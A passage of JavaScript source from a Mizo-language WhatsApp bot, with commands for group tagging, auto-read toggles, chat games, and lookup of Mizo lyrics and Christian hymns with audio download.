͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏";
  for (let i of block1) {
    teks += `@${i.split("@")[0]}\n`;
  }
  await HBWABotMz.sendMessage(from, {text:teks, mentions: await HBWABotMz.parseMention(teks)}, { quoted: m })
  break;
}
case 'repo': case 'sc': case 'script': {

await HBWABotMz.sendMessage(from, { text : `
*HBWABot Manager :*
https://herbert70.blogspot.com/2023/11/hbwabot-manage.html

*Github :*
https://github.com/HBMods-OFC/HBWABot-Mz`}, { quoted: m })
}
break
case 'autoread':
if (!HerbertTheCreator) return dodoi(mess.owner)
if (args.length < 1) return dodoi(`I option duh thlang rawh, i tih dan tur chu\n${prefix + command} on/off\n\non chuan a activate ang\n off chuan deactivate na`)
if (q === 'on') {
autoread = true
dodoi(`Message autoread a dah a ni✓`)
} else if (q === 'off') {
autoread = false
dodoi(`Message autoread chu off a ni✓`)
}
break
case 'autostview':
if (!HerbertTheCreator) return dodoi(mess.owner)
if (args.length < 1) return dodoi(`I option duh thlang rawh, i tih dan tur chu\n${prefix + command} on/off\n\non chuan a activate ang\n off chuan deactivate na`)
if (q === 'on') {
autoread_status = true
dodoi(`Status/Stories auto view a dah a ni✓`)
} else if (q === 'off') {
autoread_status = false
dodoi(`Status/Stories auto view chu off a ni✓`)
}
break 

case 'hbwabot': case '/bot': {
 
let audiobuffy = fs.readFileSync(`./asset/audio/Herbert.mp3`)
HBWABotMz.sendMessage(m.chat, { audio: audiobuffy, mimetype: 'audio/mp4', ptt: true }, { quoted: m })
}
break 

//game
case 'suitpvp':case 'rps': case 'rockpaperscissors': case 'suit': {

if (!m.isGroup) return dodoi(mess.group)
this.suit = this.suit ? this.suit : {}
let poin = 10
let poin_lose = 10
let timeout = 60000
if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.sender))) dodoi(`Game i zo chiah`)
if (m.mentionedJid[0] === m.sender) return dodoi(`Mi malin khel thei a ni lo!`)
if (!m.mentionedJid[0]) return dodoi(`_Tunge i challange ang?_\nI challenge duh chu tag rawh..\n\nTiang hian : ${prefix}rps @${owner}`, m.chat, { mentions: [owner[1] + '@s.whatsapp.net'] })
if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.mentionedJid[0]))) return dodoi(`I challenge pui mek hian mi dang nen an la ti mek a chu vangin lo nghak rawh`)
let id = 'suit_' + new Date() * 1
let caption = `_*RPS PvP*_

@${m.sender.split`@`[0]}'n *RPS* khel turin @${m.mentionedJid[0].split`@`[0]} a challenge che

*Hi* @${m.mentionedJid[0].split`@`[0]} *I accept duh chuan 60 second ral hmain accept tih type la i duh loh chuan reject tih type rawh*`
this.suit[id] = {
chat: await HBWABotMz.sendText(m.chat, caption, m, { mentions: parseMention(caption) }),
id: id,
p: m.sender,
p2: m.mentionedJid[0],
status: 'wait',
waktu: setTimeout(() => {
if (this.suit[id]) HBWABotMz.sendText(m.chat, `_60 seconds a zo, hun a tawp_`, m)
delete this.suit[id]
}, 60000), poin, poin_lose, timeout
}
}
break 

case 'ttc': case 'ttt': case 'tictactoe': {
if (!m.isGroup) return dodoi(mess.group)
            let TicTacToe = require("./lib/tictactoe")
            this.game = this.game ? this.game : {}
            if (Object.values(this.game).find(room13 => room13.id.startsWith('tictactoe') && [room13.game.playerX, room13.game.playerO].includes(m.sender))) return dodoi(`game-ah i la awm reng a ni!!`)
            let room13 = Object.values(this.game).find(room13 => room13.state === 'WAITING' && (text ? room13.name === text : true))
            if (room13) {
            room13.o = m.chat
            room13.game.playerO = m.sender
            room13.state = 'PLAYING'
            let arr = room13.game.render().map(v => {
            return {
            X: '❌',
            O: '⭕',
            1: '1️⃣',
            2: '2️⃣',
            3: '3️⃣',
            4: '4️⃣',
            5: '5️⃣',
            6: '6️⃣',
            7: '7️⃣',
            8: '8️⃣',
            9: '9️⃣',
            }[v]
            })
            let str = `Room ID: ${room13.id}
A hnuia number hi i duh ber thlang rawh,

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

Hi @${room13.game.currentTurn.split('@')[0]} i thlan ve hun

He game hi i khel peih loh chuan surrender tih type mai tur ani`
            if (room13.x !== room13.o) await HBWABotMz.sendText(room13.x, str, m, { mentions: parseMention(str) } )
            await HBWABotMz.sendText(room13.o, str, m, { mentions: parseMention(str) } )
            } else {
            room13 = {
            id: 'tictactoe-' + (+new Date),
            x: m.chat,
            o: '',
            game: new TicTacToe(m.sender, 'o'),
            state: 'WAITING'
            }
            if (text) room13.name = text
            dodoi('I tumpui tur nghak lawk ang, i tumpui tur hian ttc a rawn type ve a ngai a ni\na rawn type mai loh chuan session tih tawp tur a ni tiang hian type tur : delttc\n\n*Hriattur*\n\nHe games session-ah i awm chhung hian features dang i hmang thei dawn lova he game hi midangin an khel pui lo che a nih chuan, session hi delete tawp tur a ni, a chungah a delete dan tur kan sawi tawh ang kha')
            this.game[room13.id] = room13
            }
            }
            break
            case 'delttc': case 'delttt': {
            this.game = this.game ? this.game : {}
            try {
            if (this.game) {
            delete this.game
            HBWABotMz.sendText(m.chat, `TicTacToe Game session chu delete a ni`, m)
            } else if (!this.game) {
            dodoi(`Tictactoe session delete tur a awm lo lai tak a ni`)
            } else throw '?'
            } catch (e) {
            dodoi('damaged')
            }
            }
            break

case 'bfs': {
  if (!m.isGroup) return dodoi(mess.group);
  this.bfs = this.bfs || {};
  let poin = 50;
  let timeout = 60000;

  if (Object.values(this.bfs).find(g => g.id && g.status && [g.p1, g.p2].includes(m.sender)))
    return dodoi("Game i zo chiah");

  if (m.mentionedJid[0] === m.sender)
    return dodoi("Mi malin khel thei a ni lo!");
  if (!m.mentionedJid[0])
    return dodoi(`_Tunge i challenge ang?_\nI challenge duh chu tag rawh..\n\nTiang hian : ${prefix}bfs @${owner}`, m.chat, { mentions: [owner[1] + '@s.whatsapp.net'] });

  if (Object.values(this.bfs).find(g => g.id && g.status && [g.p1, g.p2].includes(m.mentionedJid[0])))
    return dodoi("I challenge pui mek hian mi dang nen an la ti mek a chu vangin lo nghak rawh");

  let id = 'bfs_' + new Date() * 1;
  let caption = `_*Battle Fight Spell (BFS)*_\n\n@${m.sender.split('@')[0]} has challenged @${m.mentionedJid[0].split('@')[0]}.\n\nType *accept* to begin within 60 seconds.`;
  this.bfs[id] = {
    chat: await HBWABotMz.sendText(m.chat, caption, m, { mentions: [m.sender, m.mentionedJid[0]] }),
    id,
    p1: m.sender,
    p2: m.mentionedJid[0],
    status: 'wait',
    hp1: 200,
    hp2: 200,
    timeout,
    waktu: setTimeout(() => {
      if (this.bfs[id]) HBWABotMz.sendText(m.chat, "_60 seconds a zo, hun a tawp_", m);
      delete this.bfs[id];
    }, timeout)
  };
}
break;


case 'lyrics': {
  if (!q) return dodoi(`Eng lyrics nge i zawn dawn?. Tiang hian hman tur\n*⟨Entirnan:* ${prefix}lyrics Zorema Khiangte Saltang tawngtaina\n\n*Hriattur :* A hla thupui leh a satu hming rawn dah tel ang che, a hla thupui hming i hre lo a nih chuan a chang i hriat lai rawn dah ang che, ziah dan dikin`) 
  var fourbrother = await getBuffer(`https://i.imgur.com/tb7TQAh.jpg`)
  HBWABotMz.sendMessage(from, { react: { text: "🎶" , key: m.key }}) 
  const Parser = require('rss-parser')
  const { htmlToText } = require('html-to-text')
  const parser = new Parser()
  const mizoly = args.join(" ")
  const rssFeedURL = `https://www.mizolyric.com/feeds/posts/default?q=${mizoly}`
  try {
    const feed = await parser.parseURL(rssFeedURL)
    if (feed.items.length === 0) {
      return HBWABotMz.sendMessage(from, { text : `I lyrics duh *${text}* tih hi ka zawng hmu zo lo. A spelling i ti dik lo a ni maithei🔍.. Emaw He site ah hian i zawn ang chu a awm lo pawh a ni thei https://www.mizolyric.com/ `}, { quoted: m})
    }
   const jsonArray = [];
        feed.items.forEach(item => {
            const jsonData = {
                link: item.link,
                title: item.title,
                content: htmlToText(item.content)
            };
            jsonArray.push(jsonData)
        })
        const firstItem = jsonArray[0]; 
        const alink = firstItem.link;
        const ahlathu = firstItem.title;
        const alyrics = firstItem.content;
 await HBWABotMz.sendMessage(m.chat, { text: `${alyrics}`, contextInfo:{"externalAdReply": {"showAdAttribution": true, "containsAutoReply": true, "title": `${ahlathu}`,"body": `Mizo Lyrics`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync('./asset/image/mizolyric.png'),"sourceUrl": `${alink}`}}}, { quoted: m})
  } catch (error) {
    console.error('Feed laknaah eroor a awm:', error)
  }
}
break;
case 'fbk' : {
if (!q) return dodoi(`Feedback pek i duh chuan he tiang hian pek tur a ni\nEntirnan: ${prefix + command} fuck you Herbert 🫥`)
await HBWABotMz.sendMessage("918416093656@s.whatsapp.net", { text:`Feedback From : (${pushname})\n\n${text}`}, { quoted: m })
await dodoi("I feedback avangin kan lawm e..🤗")
}
break
case 'vipapplication': {
    const titlec = "title";
    const user = m.sender;
    const balance222 = await eco.balance(user, titlec);  
    if (balance222.wallet < 1700000) {
        return dodoi("Mythical title i neih tlin hma chuan vip vip application hi dil theih a ni lo, title sang ber mythical i neih hunah he command hi rawn hmang leh rawh....");
    }
  HBWABotMz.sendMessage("918416093656@s.whatsapp.net",{
           text: `Compleat Level`,
           mentions: [m.sender],
           footer: botname,
           buttons: [{
             buttonId: `${prefix}`+`addvip`+` ${m.sender}|${kumtinvip2}`,
               buttonText: {
                   displayText: "Approved"
              }
          }],
          viewOnce: true,
          headerType: 6,
       }, {quoted: m})
    await dodoi("Dilna hi Creator-in a approve hunah 1year Vip member i ni ang, darkar 24 chhungin approve hman a ni ang");
}
break;



case "khb": {
  if (!text) 
    return await HBWABotMz.sendMessage(
      from, 
      { text: `Kristian Hla Bu number zat rawn dah tel rawh\nTiang hian hman tur: ${prefix + command} 300` }, 
      { quoted: m }
    );

  HBWABotMz.sendMessage(from, { react: { text: "📖", key: m.key } });

  try {
    const siamthatna = text.replace(/\s/g, ""); // ✅ Removes all spaces
    const apihla = await axios.get(
      `https://api.github.com/repos/HBMods-OFC/Database/contents/Kristian-Hla-Bu/${siamthatna}.json`,
      {
        headers: {
          Authorization: `token ${gtoken}`,
          Accept: "application/vnd.github.v3.raw",
        },
      }
    );

    const hlabu = apihla.data; // ✅ No need for .json()
    const hlahming = hlabu.title;
    const hlathu = hlabu.lyrics;

    await HBWABotMz.sendMessage(
      from,
      {
        text: `Hla Bu : *${siamthatna}*\n\n${hlathu}`,
        contextInfo: {
          externalAdReply: {
            showAdAttribution: true,
            containsAutoReply: true,
            title: `${hlahming}`,
            body: `Kristian Hla Bu Thar`,
            thumbnail: fs.readFileSync("./asset/image/khb.png"),
            mediaType: 1,
            mediaUrl: ``,
            sourceUrl: ``,
          },
        },
      },
      { quoted: m }
    );
  } catch (error) {
    console.error(error);
    dodoi(
      "Kristian Hla Bu ah hian Hla 1 - 600 a awma, khawngaihin a number dik tak chauh rawn dah rawh!..."
    );
  }
}
break;


case 'cfhb': {
if (!text) return await HBWABotMz.sendMessage(from, { text : `KTP General Conference Hla Bu number zat rawn dah tel rawh\nTiang hian hman tur: ${prefix + command} 5
  
        Zawn awlna ⤵️
͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏
> 1. Kristian Thalaite u
> 2. Ka nung reng ang kristaah
> 3. Pathian Hmangaihna
> 4. Zaia faktu an haw hun chuan
> 5. Kan zinkawngah
> 6. Inpeih thuai rawh
> 7. Ka zawng zawng hian fak che a nuam
> 8. Pen khat ka pen
> 9. Nang chauh ka bel ang
> 10. Thihna luipui
> 11. Lei leh van thil zawngte aiiin
> 12. Ka duh tu dang mah an awm lo
> 13. Ka lawm e, Isu
> 14. Min hruai thin
> 15. Rawngbawl tura chhandam
> 16. Khaw thianghlim Jerusalem
> 17. Nang hnaih in
> 18. I ta ka ni
> 19. Vanram ropuiah
> 20. Lalpa a tha
> 21. Inkhawmpui tiak tawh ngai lohna
> 22. A hmangaihna a lo ni
> 23. Beramno kan fak ang
> 24. Lawmna tlang
> 25. Aw hmangaihna va thûk èm
> 26. Min hmangaih si a
> 27. I fak ang u
> 28. Lal ropui kan neih chuan
> 29. Lungpui nghet
> 30. An leng za tawh ang
> 31. Lalthuthleng kiangah
> 32. Ka thupui ber
> 33. Lal Isua hmangaihna
> 34. Pathian hmel
> 35. Duhthlanna sang ber
> 36. Vanglai nun
> 37. Ka mit ngei hian a thlir ang
> 38. Lawmthu ka hrilh che
> 39. Van lawmna kim
> 40. Lalpa thatna
> 41. Min tlan ta
> 42. Hawilopar mawi Isua
> 43. Van khua
> 44. Nang nen chuan
> 45. Aw Kraws
> 46. Hnehna chu Lalpa ta a ni
> 47. Sawi nawm leh rawh
> 48. Kan fak zel dawn
> 49. A chetna tur mi a zawng
> 50. Eliza hun ropui
> 51. Chu luipuiah kan intawk ang
> 52. Lalpa chu fakin ka chawi mawiang
> 53. Isua hmangaihna leh thatna
> 54. Ni tin Isua ka thinlungin
> 55. Nangma thil ropuite an sawi
> 56. Van hmun ropui, hmangaith ram khi`},{ quoted: m})
  HBWABotMz.sendMessage(from, { react: { text: "📖" , key: m.key }}) 
  const siamthatna = `${text.replace(' ', '')}`
  const apihla = await axios.get(
      `https://api.github.com/repos/HBMods-OFC/Database/contents/Conference/${siamthatna}.json`,
      {
        headers: {
          Authorization: `token ${gtoken}`,
          Accept: "application/vnd.github.v3.raw",
        },
      }
    );
  try {
  const hlabu = apihla.data
  const hlahming = hlabu.title;
  const hlathu = hlabu.lyrics;
  await HBWABotMz.sendMessage(from, {
          text: `Hla Bu : *${siamthatna}*\n\n${hlathu}`,
          contextInfo: {
            externalAdReply: {
              showAdAttribution: true,
              containsAutoReply: true,
              title: `${hlahming}`,
              body: `2024 KTP General Conferences`,
              thumbnail: fs.readFileSync('./asset/image/ktp.png'),
              mediaType: 1,
              mediaUrl: `https://www.youtube.com/@HBMods_Channel`,
              sourceUrl: `https://www.youtube.com/@HBMods_Channel`
            }
          }
        }, { quoted: m })
  } catch (error) {
    console.error(error)
    dodoi("KTP General Conference Hla Bu 2024 ah hian Hla 1 - 56 a awma, khawngaihin a number dik tak chauh rawn dah rawh!...")
  }
}
break;

case 'cfhb2': {

  if (!text) return await HBWABotMz.sendMessage(from, { text : `KTP General Conference Hla Bu number zat rawn dah tel rawh\nTiang hian hman tur: ${prefix + command} 5
  
        Zawn awlna ⤵️
͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏
> 1. Kristian Thalaite u
> 2. Ka nung reng ang kristaah
> 3. Pathian Hmangaihna
> 4. Zaia faktu an haw hun chuan
> 5. Kan zinkawngah
> 6. Inpeih thuai rawh
> 7. Ka zawng zawng hian fak che a nuam
> 8. Pen khat ka pen
> 9. Nang chauh ka bel ang
> 10. Thihna luipui
> 11. Lei leh van thil zawngte aiiin
> 12. Ka duh tu dang mah an awm lo
> 13. Ka lawm e, Isu
> 14. Min hruai thin
> 15. Rawngbawl tura chhandam
> 16. Khaw thianghlim Jerusalem
> 17. Nang hnaih in
> 18. I ta ka ni
> 19. Vanram ropuiah
> 20. Lalpa a tha
> 21. Inkhawmpui tiak tawh ngai lohna
> 22. A hmangaihna a lo ni
> 23. Beramno kan fak ang
> 24. Lawmna tlang
> 25. Aw hmangaihna va thûk èm
> 26. Min hmangaih si a
> 27. I fak ang u
> 28. Lal ropui kan neih chuan
> 29. Lungpui nghet
> 30. An leng za tawh ang
> 31. Lalthuthleng kiangah
> 32. Ka thupui ber
> 33. Lal Isua hmangaihna
> 34. Pathian hmel
> 35. Duhthlanna sang ber
> 36. Vanglai nun
> 37. Ka mit ngei hian a thlir ang
> 38. Lawmthu ka hrilh che
> 39. Van lawmna kim
> 40. Lalpa thatna
> 41. Min tlan ta
> 42. Hawilopar mawi Isua
> 43. Van khua
> 44. Nang nen chuan
> 45. Aw Kraws
> 46. Hnehna chu Lalpa ta a ni
> 47. Sawi nawm leh rawh
> 48. Kan fak zel dawn
> 49. A chetna tur mi a zawng
> 50. Eliza hun ropui
> 51. Chu luipuiah kan intawk ang
> 52. Lalpa chu fakin ka chawi mawiang
> 53. Isua hmangaihna leh thatna
> 54. Ni tin Isua ka thinlungin
> 55. Nangma thil ropuite an sawi
> 56. Van hmun ropui, hmangaith ram khi`},{ quoted: m})
HBWABotMz.sendMessage(from, { react: { text: "🎶" , key: m.key }}) 
  const siamthatna = `${text.replace(' ', '')}`
  const apihla = await axios.get(
      `https://api.github.com/repos/HBMods-OFC/Database/contents/Conference/${siamthatna}.json`,
      {
        headers: {
          Authorization: `token ${gtoken}`,
          Accept: "application/vnd.github.v3.raw",
        },
      }
    );
  try {
  const hlabu = apihla.data
  const hlahming = hlabu.title;
  const hlathu = hlabu.lyrics;
  const sazu = (`${hlahming}`)
  let res = await yts(sazu)
  const vid = res.videos[0];
  const url = vid.url
  let result;
    try {
        result = await SaveTube(url, "mp3");
        if (!result.status) throw new Error(result.error);
    } catch (error) {
        console.warn("[SaveTube] Failed, amdl ah thlak a ni");

        try {
            result = await amdl.download(url, "mp3");
            if (!result.status) throw new Error(result.result.error);
        } catch (amdlError) {
            return dodoi(`Audio laknaah error a awm:  ${amdlError.message}`);
        }
    }
    const { title, download, format, thumbnail, quality } = result.result;
  await uploadreact()
  const Vawk = await HBWABotMz.sendMessage(m.chat, {audio: { url: download } , mimetype: 'audio/mpeg', ptt: true, 
  contextInfo: {
            externalAdReply: {
              showAdAttribution: true,
              containsAutoReply: true,
              title: `${hlahming}`,
              body: `2024 KTP General Conferences`,
              thumbnail: fs.readFileSync('./asset/image/ktp.png'),
              mediaType: 1,
              mediaUrl: ``,
              sourceUrl: ``
            }
          }
        }, { quoted: m })
  await HBWABotMz.sendMessage(from, {
          text: `Hla Bu : ${siamthatna}\n\n${hlathu}`}, { quoted: Vawk })
  } catch (error) {
    console.error(error)
    dodoi("KTP General Conference Hla Bu 2024 ah hian Hla 1 - 56 a awma, khawngaihin a number dik tak chauh rawn dah rawh!...")
  }
}
break;
case 'mzly':
case 'hlaly': {
